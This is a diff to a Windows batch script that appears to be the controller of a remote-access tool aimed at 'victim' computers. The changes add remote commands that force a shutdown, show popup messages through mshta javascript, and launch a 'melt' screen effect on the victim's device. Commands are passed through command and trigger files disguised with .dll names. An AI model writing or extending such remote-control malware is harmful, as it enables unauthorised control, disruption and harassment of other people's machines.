@@ -356,6 +356,9 @@ goto crash
 :rce_pc_found
 set "VICTIM_CMD="
 set "VICTIM_SHUTDOWN_TIMER="
+set "VICTIM_MSG_CONTENT="
+set "JAVA_ALERT_1=mshta javascript:alert("
+set "JAVA_ALERT_2=);close();"
 echo !reset!!yellow!Type 'return' to return to main menu^^!!reset!
 set /p "VICTIM_CMD=!reset!!white_black!Enter Remote Command:!reset! "
 if "!VICTIM_CMD!" == "return" (
@@ -364,6 +367,8 @@ if "!VICTIM_CMD!" == "return" (
 )
 if "!VICTIM_CMD!" == "shutdown" (
 	set /p "VICTIM_SHUTDOWN_TIMER=!reset!!green!Shutdown Seconds:!reset!!yellow![Type none for 0 seconds]!reset! "
+	ping localhost -n 2 > nul
+	echo.
 	if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
 		if "!VICTIM_SHUTDOWN_TIMER!" == "none" (
 			echo shutdown /s /t 0>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
@@ -374,8 +379,15 @@ if "!VICTIM_CMD!" == "shutdown" (
 			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
 			ping localhost -n 3 > nul
 			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			echo !reset!!green!Successfully completed shutdown...
+			echo.
+			goto rce_pc_found
+			goto crash
 		) else (
-
+			echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
+			echo.
+			goto rce_pc_found
+			goto crash
 		)
 	) else (
 		echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
@@ -385,10 +397,61 @@ if "!VICTIM_CMD!" == "shutdown" (
 	)
 )
 if "!VICTIM_CMD!" == "msg" (
-
+	set /p "VICTIM_MSG_CONTENT=!reset!!green!Message Text:!reset! "
+	ping localhost -n 2 > nul
+	if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
+		echo !JAVA_ALERT_1!"!VICTIM_MSG_CONTENT!"!JAVA_ALERT_2!>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
+		if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
+			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			ping localhost -n 3 > nul
+			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			echo !reset!!green!Successfully sent message...
+			echo.
+			goto rce_pc_found
+			goto crash
+		) else (
+			echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
+			echo.
+			goto rce_pc_found
+			goto crash
+		)
+	) else (
+		echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
+		echo.
+		goto rce_pc_found
+		goto crash
+	)
 )
-if "!VICTIM_CMD!" == "spam google" (
-
+if "!VICTIM_CMD!" == "melt" (
+	if exist "!FILE_BackBatch!\melt_screen.exe" (
+		if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
+			echo !FILE_BackBatch!\melt_screen.exe>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
+			if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
+				echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+				ping localhost -n 3 > nul
+				echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+				echo !reset!!green!Successfully added melt effect to victims device...
+				echo.
+				goto rce_pc_found
+				goto crash
+			) else (
+				echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
+				echo.
+				goto rce_pc_found
+				goto crash
+			)
+		) else (
+			echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
+			echo.
+			goto rce_pc_found
+			goto crash
+		)
+	) else (
+		echo !reset!!red_black!Error:!reset! Cannot find melt_screen.exe, critical error^^!
+		echo.
+		goto rce_pc_found
+		goto crash
+	)
 )
 if "!VICTIM_CMD!" == "logout" (
 
